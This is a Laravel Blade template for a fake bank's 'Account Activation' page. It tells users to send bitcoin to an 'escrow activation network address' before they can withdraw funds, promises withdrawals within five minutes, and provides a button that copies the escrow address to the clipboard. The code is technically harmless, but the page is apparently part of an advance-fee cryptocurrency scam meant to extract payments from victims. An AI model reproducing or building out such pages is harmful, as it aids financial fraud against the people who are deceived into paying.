@include('bank_user.header')

<div class="content-body">
    <div class="container-fluid">
        <div class="card">
            <div class="card-body">
                <h4>Account Activation</h4>
                <p>Your current status: <strong>{{ $activationStatus }}</strong></p>

                <div class="mt-4">
                    <button id="copyAddress" class="btn btn-primary">Copy Address</button>
                    <p class="text-muted mt-2">
                        Please make sure you send the required activation bitcoin link to your escrow activation network
                        address to activate your account in order to make it active for your account optimization and for
                        successful withdrawal without delay.
                        <br>
                        <strong>Note:</strong> Withdrawal to any account is within 5 minutes. We're fast and reliable.
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    document.getElementById('copyAddress').addEventListener('click', function () {
        navigator.clipboard.writeText("{{ $escrowAddress }}").then(function () {
            alert('Address copied successfully!');
        });
    });
</script>

@include('bank_user.footer')
